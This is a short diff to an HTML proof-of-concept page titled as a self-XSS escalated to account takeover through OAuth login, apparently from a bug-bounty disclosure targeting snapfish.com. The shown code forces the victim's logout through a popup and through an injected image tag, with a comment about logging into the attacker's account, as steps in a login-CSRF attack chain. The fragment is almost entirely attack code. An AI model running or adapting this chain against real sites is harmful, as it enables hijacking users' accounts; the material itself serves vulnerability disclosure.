@@ -3,10 +3,19 @@
 <html>
 
 <body>
+    <h1>Self XSS escalated to Account Takeover by leveraging oAuth login functionality</h1>
+    <h3>By Kharaone</h3>
     <script type="text/javascript">
-        function step1() {
+        function step1a() {
             const handle = window.open("https://www.snapfish.com/logout","_blank");
             setTimeout(() => {handle.close();}, 5000);
+            
+        }
+        function step1() {
+            var logoutImage = document.createElement('img');
+            logoutImage.setAttribute('src', 'https://www.snapfish.com/logout');
+            //Log in to attacker account
+            document.body.appendChild(logoutImage);
             
         }
 
